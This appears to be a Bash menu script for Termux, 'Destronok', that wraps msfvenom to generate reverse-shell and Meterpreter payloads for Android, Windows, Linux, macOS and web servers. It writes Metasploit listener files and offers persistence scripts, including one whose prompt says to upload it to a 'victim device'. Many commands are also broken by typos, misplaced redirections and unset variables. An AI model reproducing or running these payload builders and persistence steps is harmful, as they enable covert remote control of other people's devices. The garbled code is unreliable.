#!/data/data/com.termux/files/home/Destronok/bin/bash
# THIS TOOL IS WRITTEN ONLY FOR TURMUX NO ROOT USER
# TOOL CODED BY KOCKBE4U
# PROGRAM BY SUBHO GOSWAMI

function banner(){
echo -e "\e[101m=======================================================\e[0m"
echo -e "\e[44m ___               _                              _    "
echo -e "\e[44m|   \   ___   ___ | |_   _ _   ___   _ _    ___  | |__ "
echo -e "\e[44m| |) | / -_) (_-< |  _| | '_| / _ \ | ' \  / _ \ | / / "
echo -e "\e[44m|___/  \___| /__/  \__| |_|   \___/ |_||_| \___/ |_\_\ "
echo -e "\e[101m=======================================================\e[0m"
echo -e "\e[100m========= ver 1.0 ==CODING=BY=SUBHAYAN GOSWAMI=========\e[0m"
read ban
}


function checkinternet(){

clear

echo -e  " [+] CHECK ARE U CONNECTED OR NOT "
echo -e  "++++++++++++++==========+++++++++++++++"
ping -q -w1 -c1 8.8.8.8
wget -q --tries=10 --timeout=20 --spider http://google.com
if [[ $? -eq 0 ]]; 
then
        echo "YOU ARE CONNECTED"
else
        echo "YOU ARE OFFLINE"
fi
}
function start(){

clear
echo " " 
echo " "
echo -e "\e[92m|==================================|" 
echo -e "\e[92m|     \e[45m WELCOME TO DESTRONOCK\e[0m       \e[92m|"             
echo -e "\e[92m|   \e[100m HACKING WEAPON FOR TERMUX\e[0m     \e[92m|"                 
echo -e "\e[92m|==================================\e[92m|"
echo -e "\e[92m| \e[41m USE THIS TOOL AT YOUR OWN RISK\e[0m \e[92m |"
echo -e "\e[92m|==================================\e[92m|"
sleep 2
}

function server(){

clear
echo -e  " [${ye}?${blue}]CONNECT TO DWTABASE"
/dev/null 2>&1 
 /dev/null 2>&1
mkdir -p $PREFIX/var/lib/postgresql
initdb $PREFIX/var/lib/postgresql
pg_ctl -D $PREFIX/var/lib/postgresql start
echo ""
echo ""                                
echo -e "  SUCCESSFULLY CONNECTED TO DETABASE  "
sleep 2
echo " "

}

function exip(){
clear
echo " "
echo -e "\e[34m |===============================|" 
echo -e "\e[34m |  \e[95mTHANKS FOR USING DESTRONOCK\e[34m  |"
echo -e "\e[34m |      \e[96mHAVE A NICE DAY \e[34m         |"
echo -e "\e[34m |===============================|"
echo -e "\e[34m |    \e[93mTHANKS FOR YOUR SUPPORT \e[34m   |"
echo -e "\e[34m |===============================|"
sleep 1
exit
}

function lhost(){

echo -e  " ENTER YOUR LOCAL IP (EX:127.0.0.1) "
echo -n -e  "[HOST IP]:"
read lhost

}
function lport(){

echo -e  "ENTER YOUR LOCAL PORT (EX:4444) "
echo -n -e  "[LOCAL PORT]:"
read lport

}
function pname(){

echo -n -e " [N] ENTER YOUR PAYLOAD NAME(EX: SPY) :>"
read name

}

function metasploit(){

echo -e  "PLEASE GIVE ME FEW MINUTE"
msfconsole
use exploit/multi/handler

}

#====================================================BINARY======================================================================================
function android(){
clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R -o /sdcard/destronok/$name.apk > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read android  
returu
}
 function linux(){
clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f elf /sdcard/destronok/$name.elf > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read linux  
returu
}

 function windows(){
clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND"  
echo " "
msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f exe > /sdcard/destronok/$name.exe > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read windows  
returu
}

 function mac(){
clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f macho > /sdcard/destronok/$name.macho > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read mac  
returu
}
#=========================================================WEB=================================================================================
function php(){
clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p php/meterpreter_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronok/$name.php > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read php  
returu
}


function asp(){
clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f asp > /sdcard/destronok/$name.asp > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read asp
returu
}
function jsp(){
clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND"  
echo " "
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronok/$name.jsp > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read jsp
returu
}
 function war(){

clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$lhost LPORT=$lport -f war > /sdcard/destronok/$name.war > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read war
returu
}
#=======================================================SCRIPT===================================================================================
function python(){
clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p cmd/unix/reverse_python LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronok/$name.py > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read python
returu

}
 

function bsh(){
clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p cmd/unix/reverse_bash LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronok/$name.sh > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read bsh
returu
}
 
 
 function perl(){
clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND"  
echo " "
msfvenom -p cmd/unix/reverse_perl LHOST=$lhost LPORT=$lport -f raw > /sdcard/destronok/$name.pl > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read perl
returu
}
#=========================================================SHELL=================================================================================
function linxshl(){

clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f < /sdcard/destronok/ > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read ls
returu
}
 

function winshl(){
clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND" 
echo " "
msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f < /sdcard/destronok/$name.sh > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read wl
returu
}
 function macshl(){

clear
echo "============[ GENERATE PAYLOAD ]============="
echo ""
lhost
echo " "
lport
echo " "
echo ""
pname
echo ""
echo "GIVE ME FEW SECOND"  
echo " "
msfvenom -p osx/x86/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f < /sdcard/destronok/$name.pl > /dev/null 2>&1
echo -e  " "
echo " PAYLOAD IS SAVED ON DESTRONOCK DIRECTORY  "
echo -e " "
ls /sdcard/destronok | cat -n 
echo ""
echo "ENTER TO CONTINUE"
read ml
returu
}
 #==========================================================================================================================================
 function androidlisnr(){
            touch ~/sdcard/destronok/meterpreter_droid.rc
            echo use exploit/multi/handler > ~/sdcard/destronok/meterpreter_droid.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/sdcard/destronok/meterpreter_droid.rc
            read -p 'LHOST IP: ' lhost
            echo set LHOST $uservar >> ~/sdcard/destronok/meterpreter_droid.rc
            read -p 'lHOST PORT: ' lport
            echo set LPORT $uservar >> ~/sdcard/destronok/meterpreter_droid.rc
            echo set ExitOnSession false >> ~/sdcard/destronok/meterpreter_droid.rc
            echo exploit -j -z >> ~/sdcard/destronok/meterpreter_droid.rc
            cat ~/sdcard/destronok/meterpreter_droid.rc
            xterm -e msfconsole -r ~/sdcard/destronok/meterpreter_droid.rc
            echo "ENTER TO CONTINUE"
            read anl
            retru
            }
function linuxlisnr(){
            touch ~/sdcard/destronok/meterpreter_linux.rc
            echo use exploit/multi/handler > ~/sdcard/destronok/meterpreter_linux.rc
            echo set PAYLOAD linux/x86/meterpreter/reverse_tcp >> ~/sdcard/destronok/meterpreter_linux.rc
            read -p 'LHOST IP: ' lhost
            echo set LHOST $uservar >> ~/sdcard/destronok/meterpreter_linux.rc
            read -p 'lHOST PORT: ' lhost
            echo set LPORT $uservar >> ~/sdcard/destronok/meterpreter_linux.rc
            echo set ExitOnSession false >> ~/sdcard/destronok/meterpreter_linux.rc
            echo exploit -j -z >> ~/sdcard/destronok/meterpreter_linux.rc
            cat ~/sdcard/destronok/meterpreter_linux.rc
            xterm -e msfconsole -r ~/sdcard/destronok/meterpreter_linux.rc &
            echo "ENTER TO CONTINUE"
            read lnsr
            retru
            }
     
function windowslisnr(){
            touch ~/sdcard/destronock/meterpreter.rc
            echo use exploit/multi/handler > ~/sdcard/destronock/meterpreter.rc
            echo set PAYLOAD windows/meterpreter/reverse_tcp >> ~/sdcard/destronock/meterpreter.rc
            read -p 'lHOST PORT: ' lhost
            echo set LHOST $uservar >> ~/sdcard/destronock/meterpreter.rc
            read -p 'Set LPORT: ' lhost
            echo set LPORT $uservar >> ~/sdcard/destronock/meterpreter.rc
            echo set ExitOnSession false >> ~/sdcard/destronock/meterpreter.rc
            echo exploit -j -z >> ~/sdcard/destronock/meterpreter.rc
            cat ~/sdcard/destronock/meterpreter.rc
            xterm -e msfconsole -r ~/sdcard/destronock/meterpreter.rc &
            echo "ENTER TO CONTINUE"
            read wnl
            retru
            }
            
    function maclisnr(){
            touch ~/sdcard/destronok/meterpreter_mac.rc
            echo use exploit/multi/handler > ~/sdcard/destronok/meterpreter_mac.rc
            echo set PAYLOAD osx/x86/shell_reverse_tcp >> ~/sdcard/destronok/meterpreter_mac.rc
            read -p 'Set LHOST IP: ' lhost
            echo set LHOST $uservar >> ~/sdcard/destronok/meterpreter_mac.rc
            read -p 'Set LPORT: ' lhost
            echo set LPORT $uservar >> ~/sdcard/destronok/meterpreter_mac.rc
            echo set ExitOnSession false >> ~/sdcard/destronok/meterpreter_mac.rc
            echo exploit -j -z >> ~/sdcard/destronok/meterpreter_mac.rc
            cat ~/sdcard/destronok/meterpreter_mac.rc
            xterm -e msfconsole -r ~/sdcard/destronok/meterpreter_mac.rc
            echo "ENTER TO CONTINUE"
            read mcl
            retru
            }

#==========================================================================================================================================
function andpr(){
            touch ~/sdcard/destronok/android.sh
            echo \#\!/bin/bash >> ~/sdcard/destronok/android.sh
            echo while : >> ~/sdcard/destronok/android.sh
            echo do am start --user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity >> ~/sdcard/destronok/android.sh
            echo sleep 20 >> ~/sdcard/destronok/android.sh
            echo done >> ~/sdcard/destronok/android.sh
            cat ~/sdcard/destronok/android.sh
            echo -e "\E[1;33m==== \e[41m ANDROID.SH IS SAVE ON ~/Desktop/temp. UPLOAD IT VICTIM DEVICE \e[0m \e[1;33m====" 
            echo "========================================================================================================="
            echo ""
            echo "=== DO YOU WANT TO STATR METASPLOIT (y/n)"
            read apr
        if [ $apr == 'y' ]
         then
         metasploit
         elif [ $apr == 'n' ]
          then
            persistnc
         else
            echo -e ""
            main_menu
        fi
    }

function linpr(){
            echo -e "\E[1;33m=====\e[41m UPDATE WILL BE SOON \e[0m :) \e[1;33m====="
            echo "=================================================================="
            echo ""
            echo "=== DO YOU WANT TO STATR METASPLOIT (y/n)"
            read lpr
        if [ $lpr == 'y' ]
         then
         metasploit
         elif [ $lpr == 'n' ]
          then
            persistnc
         else
            echo -e ""
            main_menu
        fi
         }
            
function Winpr(){
            echo ""
            lhost
            echo " "
            lport
            echo -e "\E[1;33m==========\e[41m run persistence -U -X 20 -p \e[0m $lport \e[41m-r\e[0m $lhost\E[1;33m ==========="
            echo "============================================================================================================="
            echo ""
            echo "=== DO YOU WANT TO STATR METASPLOIT (y/n)"
            read wpr
        if [ $wpr == 'y' ]
         then
         metasploit
         elif [ $wpr == 'n' ]
          then
            persistnc
         else
            echo -e ""
            main_menu
        fi
         }
function mcpr(){
            echo 'use Directory/Applications/Utilities/'
            read -p 'GIVE ME YOUR PAYLOAD FILE NAME :EX = *shell.macho: ' lhost; 
            echo -e "\E[1;33m========\e[41m DEFAULT PATH /Library/Preferences/loginwindow AutoLaunchedApplicationDictionary -array-add ‘{Path=”/Applications/Utilities/$lhost”;}’\e[0m \e[1;33m======="
            echo "===================================================================================================================="
            echo ""
            echo "=== DO YOU WANT TO STATR METASPLOIT (y/n)"
            read mpr
        if [ $mpr == 'y' ]
         then
         metasploit
         elif [ $mpr == 'n' ]
          then
            persistnc
         else
            echo -e ""
            main_menu
        fi
            }
#==========================================================================================================================================
function persistnc(){

clear
     echo -e "\e[92m |=================================|"
     echo -e "\e[92m |  \e[41m  PERSISTANCE PAYLOAD    \e[0m      \e[92m|"
     echo -e "\e[92m |=================================|"
     echo -e "\e[92m |  \e[93m[1] \e[92m ANDROID                   \e[92m|"
     echo -e "\e[92m |  \e[93m[2] \e[93m LINUX                     \e[92m|"
     echo -e "\e[92m |  \e[93m[3] \e[94m WINDOWS                   \e[92m|"
     echo -e "\e[92m |  \e[93m[4] \e[95m MAC                       \e[92m|"
     echo -e "\e[92m |  \e[93m[0] \e[97m BACK TO MENU              \e[92m|"
     echo -e "\e[92m |=================================|"
echo -e "\e[93m BINRY:> "
read prpl
case $prpl in
      1) andpr
      ;;
      2) linpr
      ;;
      3) Winpr
      ;;
      4) mcpr
      ;;
      0) main_menu
      ;;
      *) echo " [-] GIVE A VALID INPUT"
         echo " [^] ENET TO TRY AGAIN"
         read aa
         menu
      ;;
esac
}

#==========================================================================================================================================
function listner(){
clear
     echo -e "\e[92m |=================================|"
     echo -e "\e[92m |  \e[41m      LISNTER       \e[0m           \e[92m|"
     echo -e "\e[92m |=================================|"
     echo -e "\e[92m |  \e[93m[1] \e[92m ANDROID                   \e[92m|"
     echo -e "\e[92m |  \e[93m[2] \e[93m LINUX                     \e[92m|"
     echo -e "\e[92m |  \e[93m[3] \e[94m WINDOWS                   \e[92m|"
     echo -e "\e[92m |  \e[93m[4] \e[95m MAC                       \e[92m|"
     echo -e "\e[92m |  \e[93m[0] \e[97m BACK TO MENU \e[0m             \e[92m|"
     echo -e "\e[92m |=================================|"
     echo -e "\e[93m BINRY:> "
read lsnr
case $lsnr in
      1) androidlisnr
      ;;
      2) linuxlisnr
      ;;
      3) windowslisnr
      ;;
      4) maclisnr
      ;;
      0) main_menu
      ;;
       *) echo " [-] GIVE A VALID INPUT"
         echo " [^] ENET TO TRY AGAIN"
         read oo
         menu
      ;;
esac
}
#==========================================================================================================================================      
function returu(){
clear
echo " "
echo -e "\e[35m |==============================\e[35m|" 
echo -e "\e[35m |    \e[93m1) \e[93mMAIN MENU\e[0m             \e[35m |"
echo -e "\e[35m |    \e[92m2) \e[92mEXIT\e[0m                  \e[35m |"
echo -e "\e[35m |==============================\e[35m|"
read f
case $f in
      1) main_menu
      ;;
      2) exip
      ;;
      *) clear 
         echo " [-] GIVE A VALID INPUT"
         returu
      ;;
esac
}
#==========================================================================================================================================
function submenu1(){

clear
     echo -e "\e[92m |=================================|"
     echo -e "\e[92m |  \e[41m      BINARY PAYLOAD       \e[0m    \e[92m|"
     echo -e "\e[92m |=================================|"
     echo -e "\e[92m |  \e[93m[1] \e[92m ANDROID PAYLOAD \e[0m          \e[92m|"
     echo -e "\e[92m |  \e[93m[2] \e[93m LINUX PAYLOAD \e[0m            \e[92m|"
     echo -e "\e[92m |  \e[93m[3] \e[94m WINDOWS PAYLOAD \e[0m          \e[92m|"
     echo -e "\e[92m |  \e[93m[4] \e[95m MAC PAYLOAD \e[0m              \e[92m|"
     echo -e "\e[92m |  \e[93m[0] \e[97m BACK TO MENU \e[0m             \e[92m|"
     echo -e "\e[92m |=================================|"
echo -e "\e[93m BINRY:> "
read bnpl
case $bnpl in
      1) android
      ;;
      2) linux
      ;;
      3) windows
      ;;
      4) mac
      ;;
      0) main_menu
      ;;
      *) echo " [-] GIVE A VALID INPUT"
         echo " [^] ENET TO TRY AGAIN"
         read aa
         menu
      ;;
esac
}
#==========================================================================================================================================
function submenu2(){

clear
     echo -e "\e[92m |=================================|"
     echo -e "\e[92m |    \e[41m      WEB  PAYLOAD       \e[0m    \e[92m|"
     echo -e "\e[92m |=================================|"
     echo -e "\e[92m |  \e[93m[1] \e[92m PHP PAYLOAD \e[0m              \e[92m|"
     echo -e "\e[92m |  \e[93m[2] \e[93m ASP PAYLOAD \e[0m              \e[92m|"
     echo -e "\e[92m |  \e[93m[3] \e[94m JSP PAYLOAD \e[0m              \e[92m|"
     echo -e "\e[92m |  \e[93m[4] \e[95m WAR PAYLOAD \e[0m              \e[92m|"
     echo -e "\e[92m |  \e[93m[0] \e[97m BACK TO MENU \e[0m             \e[92m|"
     echo -e "\e[92m |=================================|"
echo -e "\e[93m WEB:> "
read wbpl
case $wbpl in
      1) php
      ;;
      2) asp
      ;;
      3) jsp
      ;;
      4) war
      ;;
      0) main_menu
      ;;
      *) echo " [-] GIVE A VALID INPUT"
         echo " [^] ENET TO TRY AGAIN"
         read bb
         submenu1
      ;;
esac
}
#==========================================================================================================================================
function submenu3(){

clear
     echo -e "\e[92m |=================================|"
     echo -e "\e[92m |    \e[41m   SCRIPTING PAYLOAD    \e[0m     \e[92m|"
     echo -e "\e[92m |=================================|"
     echo -e "\e[92m |  \e[93m[1] \e[92m PYTHON PAYLOAD \e[0m           \e[92m|"
     echo -e "\e[92m |  \e[93m[2] \e[93m BASH PAYLOAD \e[0m             \e[92m|"
     echo -e "\e[92m |  \e[93m[3] \e[94m PERL PAYLOAD \e[0m             \e[92m|"
     echo -e "\e[92m |  \e[93m[0] \e[97m BACK TO MENU \e[0m             \e[92m|"
     echo -e "\e[92m |=================================|"
echo -e "\e[93m SCRIPT:> "
read srpl
case $srpl in
      1) python
      ;;
      2) bsh
      ;;
      3) perl
      ;;
      0) main_menu
      ;;
      *) echo " [-] GIVE A VALID INPUT"
         echo " [^] ENET TO TRY AGAIN"
         read dd
         submenu2
      ;;
esac
}

#==========================================================================================================================================
function submenu4(){

clear
     echo -e "\e[92m |=================================|"
     echo -e "\e[92m |      \e[41m   SHELL PAYLOAD    \e[0m       \e[92m|"
     echo -e "\e[92m |=================================|"
     echo -e "\e[92m |  \e[93m[1] \e[92m LINUX SHELL \e[0m              \e[92m|"
     echo -e "\e[92m |  \e[93m[2] \e[93m WINDOWS SHELL \e[0m            \e[92m|"
     echo -e "\e[92m |  \e[93m[3] \e[94m MAC SHELL \e[0m                \e[92m|"
     echo -e "\e[92m |  \e[93m[0] \e[97m BACK TO MENU \e[0m             \e[92m|"
     echo -e "\e[92m |=================================|"
echo -e "\e[93m SHELL:> "
read srptpl
case $srptpl in
      1) linxshl
      ;;
      2) winshl
      ;;
      3) macshl
      ;;
      0) main_menu
      ;;
      *) echo " [-] GIVE A VALID INPUT"
         echo " [^] ENET TO TRY AGAIN"
         read ee
         submenu3
      ;;
esac
}
#==========================================================================================================================================
function remove(){

    echo -e $ye ""
    echo " This Module will delete all the files present in "
    echo -e $re " ghost${ye} directory of your sdcard "
    echo " "
    echo -e $cy " [=] Your Files "
    ls /sdcard/ghost | cat -n 
    echo -n -e $lg " Do you want to continue (y/n):"
        read gok
        if [ $gok == 'y' ]
         then
            cd /sdcard/ghost
            rm *
            cd $HOME
         elif [ $gok == 'n' ]
          then
            main_menu
         else
            echo -e $ye"          Invalid Input "
            remove
        fi
   
}
#==========================================================================================================================================

function main_menu(){

clear
     echo -e "\e[92m |======================================|"
     echo -e "\e[92m |     \e[41m      GENERATE PAYLOAD     \e[0m      \e[92m|"        
     echo -e "\e[92m |======================================|"
     echo -e "\e[92m |  \e[91m[1] \e[33mBINARIES \e[32m PAYLOAD  \e[0m             \e[92m|"
     echo -e "\e[92m |  \e[91m[2] \e[33mWEB       \e[32mPAYLOAD       \e[0m        \e[92m|"
     echo -e "\e[92m |  \e[91m[3] \e[33mSCRIPTING \e[32mPAYLOAD \e[0m              \e[92m|"
     echo -e "\e[92m |  \e[91m[4] \e[33mSHELL     \e[32mPAYLOAD     \e[0m          \e[92m|"
     echo -e "\e[92m |======================================|"
     echo -e "\e[92m |  \e[91m[5] \e[33mSTART \e[96m LISTNER     \e[0m             \e[92m|"
     echo -e "\e[92m |  \e[91m[6] \e[33mPAYLOAD \e[96m CLEANER   \e[0m             \e[92m|"
     echo -e "\e[92m |  \e[91m[7] \e[33mSTART \e[96m METASPLOIT   \e[0m            \e[92m|"
     echo -e "\e[92m |  \e[91m[8] \e[33mPERSISTANCE \e[96mSCRIPT  \e[0m            \e[92m|"
     echo -e "\e[92m |  \e[91m[0] \e[43mEXIT                    \e[0m        \e[92m|"
     echo -e "\e[92m |======================================|"
echo -e "\e[93m DESTRN:> "
read cho
case $cho in
     1) clear
        submenu1
        returu
        ;;
     2) clear
        submenu2
        returu
        ;;
     3) clear
        submenu3
        returu
        ;;
     4) clear
        submenu4
        returu
        ;;
     5) clear
        listner 
        returu
        ;;
     6) clear
        remove
        returu
        ;;
     7) clear
        metasploit
        returu
        ;;
     8) clear
        persistnc
        returu
        ;;
     0) echo " "
        exip
     ;;
     *) 
        echo -n " ENTER TO CONTINUE" 
        read s
        exip
     ;;
esac

}
start
checkinternet
server
banner
main_menu
